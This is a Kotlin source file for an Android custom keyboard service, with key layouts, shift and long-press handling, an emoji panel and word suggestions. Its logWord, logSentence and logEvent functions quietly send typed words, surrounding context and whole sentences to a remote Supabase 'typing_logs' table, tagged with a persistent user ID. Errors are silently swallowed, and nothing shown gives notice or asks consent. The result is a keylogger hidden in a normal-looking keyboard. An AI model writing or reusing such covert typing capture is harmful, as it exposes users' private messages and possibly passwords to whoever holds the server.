package com.example.mykeyboard

import android.content.Context
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.ColorDrawable
import android.inputmethodservice.InputMethodService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.view.Gravity
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.FrameLayout
import android.widget.GridView
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.PopupWindow
import android.widget.TextView
import android.widget.Toast
import com.example.mykeyboard.predictor.BasicPredictor
import com.example.mykeyboard.utils.ConfigManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.UUID
import kotlin.math.abs
import kotlin.math.max
import kotlin.math.min

class KeyboardService : InputMethodService() {

    private lateinit var root: FrameLayout
    private lateinit var mainContainer: LinearLayout
    private lateinit var suggestionBar: LinearLayout
    private lateinit var keyboardLayout: LinearLayout
    private lateinit var toolbarRow: LinearLayout

    private lateinit var emojiContainer: LinearLayout
    private lateinit var emojiGrid: GridView
    private lateinit var emojiBackButton: Button

    private val keyButtons = mutableListOf<Button>()
    private val suggestionButtons = mutableListOf<TextView>()

    private enum class Mode { LETTERS, NUMBERS, SYMBOLS }
    private enum class ShiftState { OFF, ON, CAPS }

    private var mode = Mode.LETTERS
    private var shiftState = ShiftState.OFF
    private var lastShiftTapTime = 0L
    private var isShiftLongPressing = false
    private var prevShiftStateBeforeLongPress = ShiftState.OFF

    private val currentWord = StringBuilder()
    private val contextWords = mutableListOf<String>()
    private lateinit var predictor: BasicPredictor

    private val mainHandler = Handler(Looper.getMainLooper())
    private var repeatingDelete: Runnable? = null
    private var longPressRunnable: Runnable? = null
    private var isLongPressActive = false
    private var touchStartX = 0f
    private var spaceLastStep = 0

    private val httpClient = OkHttpClient()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val supabaseUrl: String by lazy { ConfigManager.getString("supabase.url") }
    private val supabaseKey: String by lazy { ConfigManager.getString("supabase.key") }

    private val longPressSymbolMap = mapOf(
        "a" to listOf("@"),
        "e" to listOf("€"),
        "i" to listOf("|"),
        "o" to listOf("°"),
        "u" to listOf("_"),
        "s" to listOf("$"),
        "." to listOf("?", "!", ",")
    )

    private companion object {
        const val KEY_SHIFT = "⇧"
        const val KEY_BACKSPACE = "⌫"
        const val KEY_ENTER = "⏎"
        const val KEY_EMOJI = "☺"
        const val KEY_SPACE = "space"
        const val DOUBLE_TAP_TIMEOUT = 300L
    }

    override fun onCreate() {
        super.onCreate()
        ConfigManager.init(this)
        predictor = BasicPredictor(this)
    }

    override fun onCreateInputView(): View {
        root = FrameLayout(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.BOTTOM
            )
            setBackgroundColor(Color.TRANSPARENT)
        }

        mainContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.BOTTOM
            )
        }

        suggestionBar = createSuggestionBar()

        val keyboardPanel = FrameLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            background = resources.getDrawable(R.drawable.keyboard_container_bg, theme)
            clipToOutline = true
        }

        val bgImage = ImageView(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            setImageResource(R.drawable.bg_keyboard)
            scaleType = ImageView.ScaleType.CENTER_CROP
            alpha = 0.72f
        }

        val darkOverlay = View(this).apply {
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(Color.parseColor("#99000000"))
        }

        val panelContent = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            )
            setPadding(dp(4), dp(6), dp(4), dp(4))
        }

        keyboardLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        toolbarRow = createToolbarRow()
        setupEmojiPanel()

        panelContent.addView(keyboardLayout)
        panelContent.addView(toolbarRow)
        keyboardPanel.addView(bgImage)
        keyboardPanel.addView(darkOverlay)
        keyboardPanel.addView(panelContent)

        mainContainer.addView(suggestionBar)
        mainContainer.addView(keyboardPanel)
        root.addView(mainContainer)
        root.addView(emojiContainer)

        buildKeyboard()
        return root
    }

    private fun createSuggestionBar(): LinearLayout {
        val bar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setBackgroundColor(Color.parseColor("#111111"))
            setPadding(dp(8), 0, dp(8), 0)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(32)
            )
        }

        repeat(3) {
            val suggestionBtn = TextView(this).apply {
                layoutParams = LinearLayout.LayoutParams(
                    0,
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    1f
                ).apply {
                    setMargins(dp(3), dp(3), dp(3), dp(3))
                }
                text = ""
                textSize = 13f
                setTextColor(Color.parseColor("#D0D0D0"))
                gravity = Gravity.CENTER
                background = resources.getDrawable(R.drawable.key_bg, theme)
                isClickable = true
                isFocusable = true
                setOnClickListener {
                    val suggestion = text.toString()
                    if (suggestion.isNotEmpty()) {
                        currentInputConnection?.commitText("$suggestion ", 1)
                        currentWord.clear()
                        updateSuggestions()
                    }
                }
            }

            bar.addView(suggestionBtn)
            suggestionButtons.add(suggestionBtn)
        }

        return bar
    }

    private fun createToolbarRow(): LinearLayout {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.TRANSPARENT)
            setPadding(dp(2), dp(2), dp(2), 0)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(34)
            )
        }

        val toolbarButtons = listOf("✦", "Aa", "↧", "💼", "📷")
        toolbarButtons.forEach { label ->
            val toolbarBtn = Button(this).apply {
                text = label
                isAllCaps = false
                textSize = if (label.length == 1) 15f else 11f
                typeface = Typeface.DEFAULT_BOLD
                setTextColor(Color.parseColor("#BBBBBB"))
                background = resources.getDrawable(R.drawable.key_bg, theme)
                stateListAnimator = null
                minWidth = 0
                minimumWidth = 0
                minHeight = 0
                minimumHeight = 0
                setPadding(0, 0, 0, 0)
                layoutParams = LinearLayout.LayoutParams(
                    0,
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    1f
                ).apply {
                    setMargins(dp(3), dp(3), dp(3), dp(3))
                }
                setOnClickListener {
                    Toast.makeText(this@KeyboardService, "Coming soon", Toast.LENGTH_SHORT).show()
                }
            }
            row.addView(toolbarBtn)
        }

        return row
    }

    private fun setupEmojiPanel() {
        emojiContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
            setBackgroundColor(Color.parseColor("#111111"))
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.BOTTOM
            )
        }

        emojiBackButton = Button(this).apply {
            text = "ABC"
            isAllCaps = false
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            background = resources.getDrawable(R.drawable.key_bg, theme)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(44)
            ).apply {
                setMargins(dp(8), dp(4), dp(8), dp(8))
            }
            setOnClickListener {
                emojiContainer.visibility = View.GONE
                mainContainer.visibility = View.VISIBLE
            }
        }

        emojiGrid = GridView(this).apply {
            numColumns = 8
            stretchMode = GridView.STRETCH_COLUMN_WIDTH
            verticalSpacing = dp(8)
            horizontalSpacing = dp(8)
            setPadding(dp(10), dp(10), dp(10), dp(6))
            setBackgroundColor(Color.parseColor("#111111"))
            clipToPadding = false
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(244)
            )
        }

        val emojis = listOf(
            "😀", "😁", "😂", "🤣", "😊", "😍", "😘", "😎",
            "😢", "😭", "😡", "👍", "👎", "🙏", "👏", "🔥",
            "❤️", "✨", "🎉", "💯", "😴", "🤔", "😬", "😇",
            "🙌", "👌", "💪", "🌟", "⚡", "📷", "💼", "✅"
        )

        emojiGrid.adapter = ArrayAdapter(this, android.R.layout.simple_list_item_1, emojis)
        emojiGrid.setOnItemClickListener { _, _, pos, _ ->
            currentInputConnection?.commitText(emojis[pos], 1)
        }

        emojiContainer.addView(emojiGrid)
        emojiContainer.addView(emojiBackButton)
    }

    private fun buildKeyboard() {
        keyboardLayout.removeAllViews()
        keyButtons.clear()

        val rows = when (mode) {
            Mode.LETTERS -> listOf(
                listOf("q", "w", "e", "r", "t", "y", "u", "i", "o", "p"),
                listOf("a", "s", "d", "f", "g", "h", "j", "k", "l"),
                listOf(KEY_SHIFT, "z", "x", "c", "v", "b", "n", "m", KEY_BACKSPACE),
                listOf(KEY_EMOJI, "123", KEY_SPACE, KEY_ENTER)
            )

            Mode.NUMBERS -> listOf(
                listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0"),
                listOf("@", "#", "₹", "&", "*", "(", ")", "-", "+"),
                listOf("#+=", ".", ",", "?", "!", "/", KEY_BACKSPACE),
                listOf("ABC", KEY_SPACE, KEY_ENTER)
            )

            Mode.SYMBOLS -> listOf(
                listOf("[", "]", "{", "}", "%", "^", "<", ">", "€", "£"),
                listOf("_", "\\", "|", "~", "•", "√", "π", "÷"),
                listOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "0"),
                listOf("ABC", KEY_SPACE, KEY_BACKSPACE)
            )
        }

        val keyHeight = min(dp(48), max(dp(42), (resources.displayMetrics.heightPixels * 0.052f).toInt()))

        rows.forEachIndexed { index, row ->
            val rowLayout = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
                setPadding(rowSidePadding(index), 0, rowSidePadding(index), 0)
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    keyHeight
                ).apply {
                    setMargins(0, dp(2), 0, dp(2))
                }
            }

            row.forEach { key ->
                val btn = createKeyButton(key)
                rowLayout.addView(btn)
                keyButtons.add(btn)
            }

            keyboardLayout.addView(rowLayout)
        }

        updateShiftUI()
    }

    private fun rowSidePadding(rowIndex: Int): Int = when (mode) {
        Mode.LETTERS -> when (rowIndex) {
            1 -> dp(18)
            2 -> dp(6)
            else -> dp(2)
        }
        else -> dp(2)
    }

    private fun createKeyButton(key: String): Button {
        return Button(this).apply {
            text = if (key == KEY_SPACE) "" else key
            tag = key
            isAllCaps = false
            stateListAnimator = null
            elevation = dp(1).toFloat()
            minWidth = 0
            minimumWidth = 0
            minHeight = 0
            minimumHeight = 0
            setPadding(0, 0, 0, 0)
            textSize = when (key) {
                KEY_SHIFT, KEY_BACKSPACE, KEY_ENTER -> 20f
                KEY_SPACE -> 12f
                else -> 17f
            }
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.WHITE)
            background = resources.getDrawable(R.drawable.key_bg, theme)

            layoutParams = LinearLayout.LayoutParams(
                0,
                LinearLayout.LayoutParams.MATCH_PARENT,
                keyWeight(key)
            ).apply {
                setMargins(dp(3), dp(2), dp(3), dp(2))
            }

            setOnTouchListener { view, event -> handleTouch(view as Button, key, event) }
        }
    }

    private fun keyWeight(key: String): Float = when (key) {
        KEY_SPACE -> 4.8f
        KEY_SHIFT, KEY_BACKSPACE -> 1.35f
        KEY_ENTER -> 1.55f
        "123", "ABC", "#+=", KEY_EMOJI -> 1.25f
        else -> 1f
    }

    private fun handleTouch(button: Button, key: String, event: MotionEvent): Boolean {
        when (event.actionMasked) {
            MotionEvent.ACTION_DOWN -> {
                button.isPressed = true
                button.animate().scaleX(0.96f).scaleY(0.96f).setDuration(45).start()
                vibrate()
                isLongPressActive = false
                touchStartX = event.rawX
                spaceLastStep = 0
                handleKeyDown(key, button)
            }

            MotionEvent.ACTION_MOVE -> {
                if (key == KEY_SPACE) {
                    handleSpaceDrag(event.rawX)
                }
            }

            MotionEvent.ACTION_UP -> {
                button.isPressed = false
                button.animate().scaleX(1f).scaleY(1f).setDuration(70).start()
                handleKeyUp(key)
                button.performClick()
            }

            MotionEvent.ACTION_CANCEL -> {
                button.isPressed = false
                button.animate().scaleX(1f).scaleY(1f).setDuration(70).start()
                cancelLongPress()
                stopRepeatingDelete()
                if (isShiftLongPressing) restoreShiftAfterLongPress()
            }
        }

        return true
    }

    private fun handleKeyDown(key: String, button: Button) {
        when (key) {
            KEY_BACKSPACE -> {
                deleteOneCharacter()
                startRepeatingDelete()
            }

            KEY_SHIFT -> {
                scheduleLongPress(330) {
                    isLongPressActive = true
                    isShiftLongPressing = true
                    prevShiftStateBeforeLongPress = shiftState
                    shiftState = ShiftState.ON
                    updateShiftUI()
                }
            }

            KEY_SPACE -> {
                scheduleLongPress(330) {
                    isLongPressActive = true
                    Toast.makeText(this, "Slide spacebar to move cursor", Toast.LENGTH_SHORT).show()
                }
            }

            else -> {
                if (longPressSymbolMap.containsKey(key.lowercase())) {
                    scheduleLongPress(420) {
                        isLongPressActive = true
                        showSymbolPopup(button, key.lowercase())
                    }
                }
            }
        }
    }

    private fun handleKeyUp(key: String) {
        val wasLongPress = isLongPressActive
        cancelLongPress()

        when (key) {
            KEY_BACKSPACE -> stopRepeatingDelete()
            KEY_SHIFT -> {
                if (isShiftLongPressing) {
                    restoreShiftAfterLongPress()
                } else if (!wasLongPress) {
                    handleShiftTap()
                }
            }
            KEY_SPACE -> {
                if (!wasLongPress && spaceLastStep == 0) {
                    commitSpace()
                }
            }
            else -> {
                if (!wasLongPress) {
                    handleKey(key)
                }
            }
        }
    }

    private fun scheduleLongPress(delayMs: Long, action: () -> Unit) {
        cancelLongPress()
        longPressRunnable = Runnable(action).also {
            mainHandler.postDelayed(it, delayMs)
        }
    }

    private fun cancelLongPress() {
        longPressRunnable?.let(mainHandler::removeCallbacks)
        longPressRunnable = null
    }

    private fun startRepeatingDelete() {
        var interval = 115L
        repeatingDelete = object : Runnable {
            override fun run() {
                deleteOneCharacter()
                interval = max(38L, interval - 8L)
                mainHandler.postDelayed(this, interval)
            }
        }.also {
            mainHandler.postDelayed(it, 310L)
        }
    }

    private fun stopRepeatingDelete() {
        repeatingDelete?.let(mainHandler::removeCallbacks)
        repeatingDelete = null
    }

    private fun deleteOneCharacter() {
        currentInputConnection?.deleteSurroundingText(1, 0)
        if (currentWord.isNotEmpty()) {
            currentWord.deleteCharAt(currentWord.length - 1)
            updateSuggestions()
        }
    }

    private fun handleSpaceDrag(rawX: Float) {
        val step = ((rawX - touchStartX) / dp(28)).toInt()
        if (step == spaceLastStep) return

        val direction = if (step > spaceLastStep) KeyEvent.KEYCODE_DPAD_RIGHT else KeyEvent.KEYCODE_DPAD_LEFT
        repeat(abs(step - spaceLastStep)) {
            currentInputConnection?.sendKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, direction))
            currentInputConnection?.sendKeyEvent(KeyEvent(KeyEvent.ACTION_UP, direction))
        }
        spaceLastStep = step
        isLongPressActive = true
    }

    private fun showSymbolPopup(anchor: View, key: String) {
        val symbols = longPressSymbolMap[key].orEmpty()
        if (symbols.isEmpty()) return

        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(dp(6), dp(6), dp(6), dp(6))
            setBackgroundColor(Color.parseColor("#2A2A2A"))
        }

        val popup = PopupWindow(row, LinearLayout.LayoutParams.WRAP_CONTENT, dp(48), true).apply {
            isOutsideTouchable = true
            setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
            elevation = dp(4).toFloat()
        }

        symbols.forEach { symbol ->
            row.addView(TextView(this).apply {
                text = symbol
                textSize = 18f
                setTextColor(Color.WHITE)
                gravity = Gravity.CENTER
                setTypeface(Typeface.DEFAULT, Typeface.BOLD)
                layoutParams = LinearLayout.LayoutParams(dp(42), LinearLayout.LayoutParams.MATCH_PARENT)
                setOnClickListener {
                    currentInputConnection?.commitText(symbol, 1)
                    currentWord.clear()
                    updateSuggestions()
                    popup.dismiss()
                }
            })
        }

        popup.showAsDropDown(anchor, 0, -dp(96), Gravity.CENTER)
    }

    private fun handleKey(key: String) {
        when (key) {
            KEY_ENTER -> commitEnter()
            "123" -> {
                mode = Mode.NUMBERS
                buildKeyboard()
            }
            "#+=" -> {
                mode = Mode.SYMBOLS
                buildKeyboard()
            }
            "ABC" -> {
                mode = Mode.LETTERS
                buildKeyboard()
            }
            KEY_EMOJI -> {
                mainContainer.visibility = View.GONE
                emojiContainer.visibility = View.VISIBLE
            }
            else -> commitTextKey(key)
        }
    }

    private fun commitSpace() {
        val ic = currentInputConnection ?: return
        logWord()
        ic.commitText(" ", 1)
        if (currentWord.isNotEmpty()) {
            predictor.learnWord(currentWord.toString(), contextWords.lastOrNull())
            currentWord.clear()
        }
        updateSuggestions()
    }

    private fun commitEnter() {
        val ic = currentInputConnection ?: return
        logSentence()
        ic.commitText("\n", 1)
        if (currentWord.isNotEmpty()) {
            predictor.learnWord(currentWord.toString(), contextWords.lastOrNull())
            currentWord.clear()
        }
        contextWords.clear()
        updateSuggestions()
    }

    private fun handleShiftTap() {
        val now = System.currentTimeMillis()
        shiftState = if (now - lastShiftTapTime < DOUBLE_TAP_TIMEOUT) {
            lastShiftTapTime = 0L
            if (shiftState == ShiftState.CAPS) ShiftState.OFF else ShiftState.CAPS
        } else {
            lastShiftTapTime = now
            if (shiftState == ShiftState.OFF) ShiftState.ON else ShiftState.OFF
        }
        updateShiftUI()
    }

    private fun restoreShiftAfterLongPress() {
        isShiftLongPressing = false
        shiftState = prevShiftStateBeforeLongPress
        updateShiftUI()
    }

    private fun commitTextKey(key: String) {
        val ic = currentInputConnection ?: return
        val output = if (shiftState != ShiftState.OFF) key.uppercase() else key

        ic.commitText(output, 1)
        if (output.length == 1 && output[0].isLetter()) {
            currentWord.append(output.lowercase())
            updateSuggestions()
        } else {
            currentWord.clear()
            updateSuggestions()
        }

        if (shiftState == ShiftState.ON && !isShiftLongPressing) {
            shiftState = ShiftState.OFF
            updateShiftUI()
        }
    }

    private fun updateSuggestions() {
        val previousWord = contextWords.lastOrNull()
        val suggestions = predictor.getSuggestions(currentWord.toString(), previousWord)

        suggestionButtons.forEachIndexed { index, btn ->
            btn.text = suggestions.getOrNull(index).orEmpty()
            btn.visibility = View.VISIBLE
        }
    }

    private fun updateShiftUI() {
        keyButtons.forEach { btn ->
            val key = btn.tag as? String ?: return@forEach
            if (key.length == 1 && key[0].isLetter()) {
                btn.text = if (shiftState == ShiftState.OFF) key.lowercase() else key.uppercase()
            }

            if (key == KEY_SHIFT) {
                btn.alpha = when (shiftState) {
                    ShiftState.OFF -> 0.88f
                    ShiftState.ON -> 1f
                    ShiftState.CAPS -> 1f
                }
                btn.setTextColor(
                    if (shiftState == ShiftState.OFF) Color.WHITE else Color.parseColor("#8AB4F8")
                )
            }
        }
    }

    private fun logWord() {
        val word = currentWord.toString().trim().lowercase()
        if (word.length < 2) return

        val json = JSONObject().apply {
            put("word", word)
            put("context_before", contextWords.takeLast(2))
        }

        logEvent("WORD", json)
        contextWords.add(word)
        if (contextWords.size > 2) {
            contextWords.removeAt(0)
        }
    }

    private fun logSentence() {
        val sentence = contextWords.joinToString(" ")
        if (sentence.isEmpty()) return

        val json = JSONObject().apply {
            put("sentence", sentence)
        }

        logEvent("SENTENCE", json)
    }

    private fun logEvent(action: String, data: JSONObject) {
        val payload = JSONObject().apply {
            put("app_id", packageName)
            put("user_id", getUserId())
            put("action", action)
            put("timestamp", System.currentTimeMillis())
            put("data", data)
        }

        scope.launch {
            try {
                val req = Request.Builder()
                    .url("${supabaseUrl.trimEnd('/')}/rest/v1/typing_logs")
                    .addHeader("apikey", supabaseKey)
                    .addHeader("Authorization", "Bearer $supabaseKey")
                    .addHeader("Content-Type", "application/json")
                    .post(payload.toString().toRequestBody())
                    .build()

                httpClient.newCall(req).execute().close()
            } catch (_: Exception) {
            }
        }
    }

    private fun getUserId(): String {
        val prefs = getSharedPreferences("keyboard_prefs", MODE_PRIVATE)
        var id = prefs.getString("user_id", null)

        if (id == null) {
            id = UUID.randomUUID().toString()
            prefs.edit().putString("user_id", id).apply()
        }

        return id
    }

    private fun vibrate() {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val manager = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            manager.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(10, 55))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(10)
        }
    }

    private fun dp(value: Int): Int =
        (value * resources.displayMetrics.density).toInt()

    override fun onDestroy() {
        cancelLongPress()
        stopRepeatingDelete()
        scope.cancel()
        super.onDestroy()
    }
}
